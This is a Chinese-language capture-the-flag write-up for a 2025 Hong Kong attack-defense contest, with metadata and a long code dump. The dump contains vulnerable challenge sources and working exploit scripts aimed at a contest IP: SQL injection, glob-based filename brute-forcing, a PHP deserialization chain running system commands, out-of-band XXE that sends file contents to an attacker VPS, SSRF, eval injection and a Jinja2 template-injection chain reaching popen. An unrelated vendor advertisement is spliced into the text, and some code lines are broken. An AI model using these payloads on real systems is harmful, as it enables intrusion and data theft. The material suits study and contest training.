---
title: 香港網絡攻防精英培訓暨攻防大賽 2025 初賽/決賽WP
contest: 香港網絡攻防精英培訓暨攻防大賽 2025
year: 2025
difficulty: medium
vuln_type: web_unknown
tags:
- sqli
- union-injection
- php-glob
- htaccess-upload
- xxe
- xxe-oob
- redis-ssrf
- pickle-deserialize
- mongodb-aggregation
- php-deserialize
attack_chain:
- 'issql: ms参数POST联合注入,information_schema爆表flag,select flag from flag取内容'
- 'break: DirectoryIterator+glob:///var/www/html/逐字符fuzz爆破16字符php文件名'
- 'ez_upload: 上传任意文件+.htaccess解析所有文件为php实现RCE'
- 'XXE: test.dtd外带+data://或http://外带读文件'
- '决赛SSTI: 模板注入+山石网科推广文字(可能为干扰项)'
- '决赛nospring: SSRF+Redis未授权写Webshell或反弹shell'
key_payload: glob:///var/www/html/* + d80054c739859dfe.php
one_liner: 香港網絡攻防精英培訓賽2025初赛+决赛WP,涵盖SQL注入+PHP DirectoryIterator爆破文件名+XXE外带+Redis SSRF等基础Web题,初赛12题+决赛3题。
lesson: PHP DirectoryIterator+glob://协议是稳定的LFI/目录扫描向量,XXE无回显必须用OOB外带+恶意DTD,SSRF到Redis未授权是内网渗透标配。
quality: medium
full_path: 香港網絡攻防精英培訓暨攻防大賽_2025_初賽-決賽WP.full.md
meta_path: 香港網絡攻防精英培訓暨攻防大賽_2025_初賽-決賽WP.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '香港網絡攻防精英培訓暨攻防大賽 2025 初賽/決賽WP。香港網絡攻防精英培訓賽2025初赛+决赛WP,涵盖SQL注入+PHP DirectoryIterator爆破文件名+XXE外带+Redis SSRF等基础Web题,初赛12题+决赛3题。。关键路径：issql: ms参数POST联合注入,information_schema爆表flag,select flag from flag取内容...'
category: web
subcategory: web_other
tools_used:
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/263742.html
reasoning_chain:
- 'issql 题: 测试 ms 参数 POST 注入 → 触发点: 单引号报错 + 联合注入可用 → 动作: order by 测列数'
- '观察: union select 1,2,3... → information_schema 查表名 flag → 动作: select flag from flag'
- 'break 题: 源码给 DirectoryIterator($_GET[''path'']) → 触发点: glob:// 协议支持 → 假设文件 16 字符名'
- '动作: 18 位字符逐位 fuzz glob:///var/www/html/X* → 观察: d80054c739859dfe.php'
- '防御 patch: 把 12 长度限制改 3 即可修复 cmd 长度限制'
- 'ez_upload: 上传任意文件 + .htaccess 解析全文件为 php → 假设: 任意 RCE → 动作: 上传 shell 改后缀'
- '防御: 黑名单改白名单, 只允许图片'
- 'XXE 题: 源码见 XML 解析 → 假设: 无回显 → 动作: VPS 起 http 服务挂 test.dtd 外带'
- '决赛 SSTI: 模板注入 + 山石网科文字 (干扰项) → 动作: 测 {{7*7}} 验证 Jinja2/Thymeleaf'
- '决赛 nospring: SSRF + Redis 未授权 → 假设 gopher:// 写 Webshell → 动作: redis-cli SET shell payload'
failed_attempts:
- '试图 ms=1'' 报错注入 → 失败: 报错被抑制只能 union'
- '试图用 file:// 协议读文件 → 失败: 必须用 glob:// 走 DirectoryIterator'
- '试图绕 .htaccess 黑名单 → 失败: 直接上传 .htaccess 改解析更高效'
- '试图用回显 XXE 读 flag → 失败: 必须 OOB 外带'
key_observations:
- DirectoryIterator + glob:// 是稳定的 LFI / 文件名爆破向量
- XXE 无回显必须 OOB + 外部 DTD 外带 (data:// / http://)
- SSRF + Redis 未授权写 Webshell 是内网渗透标配链
- .htaccess 一旦能上传, 可改整个目录解析策略
prerequisites:
- SQL 联合注入基础
- PHP DirectoryIterator / glob 协议
- XXE 攻击原理 + OOB 外带手法
- Redis SSRF 利用 (gopher://)
---
# 香港網絡攻防精英培訓暨攻防大賽 2025 初賽/決賽WP

> 原文: https://www.ctfiot.com/263742.html
> ID: 263742

磨礪攻防利刃·築牢數字防線

初賽

（一）

issql

攻擊

經過測試，ms參數存在SQL注入，並且可以使用聯合注入的方式

通過元數據庫將表名注入出來，發現名為flag的表

繼續獲取列名

表名和列名均為flag，因此可以直接select flag from flag獲取flag內容

防禦

（二）
break

攻擊

給出源碼，發現使用了DirectoryIterator，可以利用glob協議來逐字fuzz文件名字

<?php  
error_reporting(E_ALL);

ini_set('display_errors','1');

#important php in path:/var/www/html and php File names have 16 characters

if (isset($_GET['path']))  
{ 
    $Input_data = $_GET['path'];
    $it=new DirectoryIterator($Input_data);
    foreach($it as $f)
    {
        $path=$f->getFilename();
        if(file_exists($path))
        {
            echo"yes,it exists";
        }
        else
        {
            echo"too naive!";
        }
    }
}   
else
{ 
    highlight_file(__file__); 
} 
?> 

使用以下exp可以獲取到

import string

import requests

url = "http://210.3.214.150:
52003/"

def is_file(p):
    param = {"path": p}
    r = requests.get(url, params=param)
    if'yes,it exists' in r.text:
        returnTrue
    returnFalse

ans = "glob:///var/www/html/"
for i in range(18):
    for j in string.printable:
        if is_file(ans + j + "*"):
            ans = ans + j
            print(ans)
            break

獲得 d80054c739859dfe.php

防禦

index.php 过滤path中存在glob關鍵字則禁止

d80054c739859dfe.php把cmd長度限制12，修改為3，發現可以修復成功

（三）
ez_upload

先上傳一個任意擴展名的文件

再傳.htaccess ，將目錄下所有的文件都解析為php進行處理

防禦

從黑名單機制改為百名單機制，嚴格過濾，只允許圖片上傳

（四）
submit

（五）
MD5

（六）
company

（七）
ezphp

（八）
happy

（九）
XXE

1. 在vps啟動一個http服務並將test.dtd放在目錄下

2. 再使用exp攻擊

（十）
crackme

（十一）
evilecho

（十二）
SSRF

決賽

（一）

cover

（二）

SSTI

（三）

nospring

山石网科是中国网络安全行业的技术创新领导厂商，由一批知名网络安全技术骨干于2007年创立，并以首批网络安全企业的身份，于2019年9月登陆科创板（股票简称：山石网科，股票代码：688030）。

现阶段，山石网科掌握30项自主研发核心技术，申请570多项国内外专利。山石网科于2019年起，积极布局信创领域，致力于推动国内信息技术创新，并于2021年正式启动安全芯片战略。2023年进行自研ASIC安全芯片的技术研发，旨在通过自主创新，为用户提供更高效、更安全的网络安全保障。目前，山石网科已形成了具备“全息、量化、智能、协同”四大技术特点的涉及基础设施安全、云安全、数据安全、应用安全、安全运营、工业互联网安全、信息技术应用创新、AI安全、安全服务、安全教育等10大类产品及服务，50余个行业和场景的完整解决方案。


```
<html xmlns="http://www.w3.org/1999/xhtml">
<!--This set of source code is made by MS. -->
<!--Date 2018.12.13-->
 <head>
  <meta http-equiv=Content-Type content="text/html;charset=utf-8">
  <meta name="description" content="Test">
  <meta name="author" content="MRYE+">
  <title>电脑信息查询 - 网络安全工作室</title>
  <link rel="stylesheet" type="text/css" href="./css/ctf.css" /> 
    </style>
</head>


  
    <labelfor="search">输入以1、2、3显示电脑信息</label>
 <formid="myForm" action="" method="post">
    
    
 </form>
<?php
//禁用错误报告
error_reporting(0);
header("Content-Type: text/html;charset=utf-8");
require_once './suxinctf.php';

if(isset($_POST["ms"]))
{
 $ID = $_POST["ms"];
    #echo $ID;
 $query = "select * from goods where id='{$ID}'";//构建查询语句
 $result = mysql_query($query);//执行查询
if (!$result) {
die("could not to the databasen" . mysql_error());
 }
if (mysql_numrows($result)<=0) {
echo"<script  type='text/javascript'>alert('都说了让你输入1~3你咋还那么调皮！');location.href='index.php'</script>";
 }else{
while($result_row=mysql_fetch_row(($result)))//取出结果并显示
 {
  $ms=$result_row[0];
  $gname=$result_row[1];
  $gprice=$result_row[2];
  $gnum=$result_row[3];
echo"电脑编号为：".$ms."   ";;
echo"电脑系统为：".$gname."  ";
echo"电脑价格为：".$gprice."  ";
echo"电脑数量为：".$gnum."  ";
}
}
}
 $query = "select * from goods ";//构建查询语句
 $result = mysql_query($query);//执行查询
if (!$result) {
die("could not to the databasen" . mysql_error());
 }
if (mysql_numrows($result)<=0) {
echo"<script  type='text/javascript'>alert('都说了让你输入1~3你咋还那么调皮！');location.href='index.php'</script>";
 }else{
while($result_row=mysql_fetch_row(($result)))//取出结果并显示
 {
  $ms=$result_row[0];
  $gname=$result_row[1];
 }

mysql_close($connection);//关闭连接
}
?>
  


</html>
<?php  
error_reporting(E_ALL);

ini_set('display_errors','1');

    #important php in path:/var/www/html and php File names have 16 characters

if (isset($_GET['path']))  
{ 
    $Input_data = $_GET['path'];
    $it=new DirectoryIterator($Input_data);
    foreach($it as $f)
    {
        $path=$f->getFilename();
        if(file_exists($path))
        {
            echo"yes,it exists";
        }
        else
        {
            echo"too naive!";
        }
    }
}   
else
{ 
    highlight_file(__file__); 
} 
?>
import string

import requests

url = "http://210.3.214.150:
52003/"

def is_file(p):
    param = {"path": p}
    r = requests.get(url, params=param)
    if'yes,it exists' in r.text:
        returnTrue
    returnFalse

ans = "glob:///var/www/html/"
for i in range(18):
    for j in string.printable:
        if is_file(ans + j + "*"):
            ans = ans + j
            print(ans)
            break
<?php
    include "utils/function.php";
    $config = include "utils/config.php";
    $user_xml_format = "<?xml version='1.0'?>
                        
                            
                                %s
                                %s
                            
                        ";
    extract($_REQUEST);
    if(empty($username)||empty($password)) die("Username or password cannot be empty XD");

    if(!preg_match('/^[a-zA-Z0-9_]+$/', $username)) die("Invalid username. :(");

    if(is_user_exists($username, $config["user_info_dir"])) die("User already exists XD");
    $user_xml = sprintf($user_xml_format, $username, $password);

    register_user($username, $config['user_info_dir'], $user_xml);
<?php
    include "utils/function.php";
    $config = include  "utils/config.php";
    $username = $_REQUEST['username'];
    $password = $_REQUEST['password'];
    if(empty($username)||empty($password)) die("Username or password cannot be empty XD");
    if(!is_user_exists($username, $config["user_info_dir"])) die("Username error");
    $user_record = get_user_record($username, $config['user_info_dir']);
    if($user_record->user->password != $password) die("Password error for User:".$user_record->user->username);
    header("Location:
main.html");
import requests

url = "http://210.3.214.150:
53585/register.php?username=000&password=121"

def xmlinj(xml):
    print(requests.post(url, data={"user_xml_format": xml}).text)

payload = '''<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///flag">
]> 

    
        &xxe;
        777
    
'''

xmlinj(payload)
$username = $_REQUEST['username'];
    $password = $_REQUEST['password'];
<?php

class hahaha
{
    public $cmd;
    public $content;

    publicfunction __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }

    publicfunction __call($name, $arguments)
    {
        call_user_func($this->cmd, $this->content);
    }

}

class Nevv
{
    public $happiness;

    publicfunction __invoke()
    {
        return$this->happiness->check();
    }

}

class Rabbit
{
    public $aspiration;
    publicfunction __set($name, $val)
    {
        echo'__set';
        return$this->aspiration->family;
    }
}

class Year
{
    public $key;
    public $rabbit;

    publicfunction __construct($key)
    {
        $this->key = $key;
    }

    publicfunction firecrackers()
    {
        return$this->rabbit->wish = "allkill QAQ";
    }

    publicfunction __get($name)
    {
        $name = $this->rabbit;
        $name();
    }

    publicfunction __destruct()
    {
        if ($this->key == "come on") {
            $this->firecrackers();
        } else {
            print ("Welcome 2025!!!!!");
        }
    }
}

$hh = new hahaha('system', 'cat /flag');
$nn = new Nevv();
$nn -> happiness = $hh;
$yeah = new Year("come on");
$yeah -> rabbit = $nn;
$n = new Rabbit();
$n->aspiration = $yeah;
$yeah1 = new Year("come on");
$yeah1 -> rabbit = $n;
echo urlencode(serialize($yeah1));

?>
<!ENTITY % aaaa SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
<!ENTITY % demo "<!ENTITY bbbb SYSTEM 'http://vps IP:
8188/?file=%aaaa;'>">
%demo;
python3 -m http.server 8188
import requests

url = "http://210.3.214.150:
57272/"

def xmlinj(xml):
    print(requests.post(url, data={"xml": xml, "submit": "提交"}).text)

payload = '''<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY % xd SYSTEM "httP://VPS IP:
8188/test.dtd">
    %xd;
]>
<root>&bbbb;</root>'''

xmlinj(payload)
<?php
header("Content-Type: text/html;charset=utf-8");
header("Hint: XXE");
$html = '';
if (isset($_POST['submit']) && $_POST['xml'] !== null) {
    $xml = $_POST['xml'];
    $forbidden_protocols = ['SYSTEM', 'system', 'file://', 'http://', 'https://', 'ftp://', 'gopher://', 'dict://'];
    $has_forbidden_protocol = false;
    foreach ($forbidden_protocols as $protocol) {
        if (strpos($xml, $protocol) !== false) {
            $has_forbidden_protocol = true;
            break;
        }
    }
    if ($has_forbidden_protocol) {
        $html .= "不允许使用该协议！";
    } else {
        $data = @simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
        if ($data) {
            $html .= "{$data}";
        } else {
            $html .= "尽情的注入吧";
        }
    }
}
?>
<form method="post">
    请输入查询 ID:
    
    
</form>
<?phpecho $html; ?>
import base64

import requests

url = "http://210.3.214.150:
59434/?crack=flag"
flag = base64.b64encode("/flag".encode()).decode("ascii")
data = {"hk": f"readfile(base64_decode('{flag}'));", "flag": "///////Give_me_flag"}

print(requests.post(url, data=data).text)
sed -i 's/hk/kh/g' /var/www/html/index.php
/index.php?file=eason.jpg'.system('cat /flag').'
<?php
echo "<h2>Tips: eval & echo = ?</h2>";
$hostHeader = $_SERVER['HTTP_HOST'];
list($hostname, $port) = explode(':', $hostHeader);
$image = isset($_GET["file"]) ? "./images/" . $_GET["file"] : "";
if ($image == "") {
    header("Location: " . "http://$hostname:$port" . "/index.php?file=eason.jpg");
}
$image = str_replace("'", "", $image);
$file = "echo '';";
if (in_array(strtolower($image), array("cat", " ", "flag", "docker", "shell_exec", "exec", "popen"))) {
    exit("Hacker!!!");
}
eval ($file);
?>
GET /index.php?url=file:///fla%2567 HTTP/1.1
Host: 210.3.214.150:
59701
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
<?php

$url = isset($_GET["url"]) ? urldecode($_GET["url"]) : "";
if ($url == "") {
    header("location: index.php?url=http://www.baidu.com");
}
$black_list = ["gopher" , "localhost", "0.0.0.0", "file", "flag", "../", "127.", "192.", "168.", "172.", "10."];
foreach ($black_list as $keyword) {
    if (strpos($url, $keyword) !== false) {
        exit("hacker!");
    }
}
$curlobj = curl_init();
curl_setopt($curlobj, CURLOPT_URL, $url);
curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($curlobj);
echo $result;
?>
import requests

url = "http://210.3.214.150:
44439/login"

payload = '''{%set x=config.update(a=config.update)%}'''
payload = '''{%set x=config.a(b=''.__class__)%}'''
payload = '''{%set x=config.a(c=config.b.__mro__[1])%}'''
payload = '''{%set x=config.a(d=config.c.__subclasses__())%}'''
payload = '''{%set x=config.a(e=config.d[137])%}'''
payload = '''{%set x=config.a(f=config.e.__init__)%}'''
payload = '''{%set x=config.a(p='__glob'+'als__')%}'''
payload = '''{%set x=config.a(g=config.f|attr(config.p))%}'''
payload = '''{%set x=config.a(h=config.g['pop'+'en'])%}'''
payload = '''{{config.h("ps -ef").read()}}'''

print(requests.post(url, data={"username": payload}).text)
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]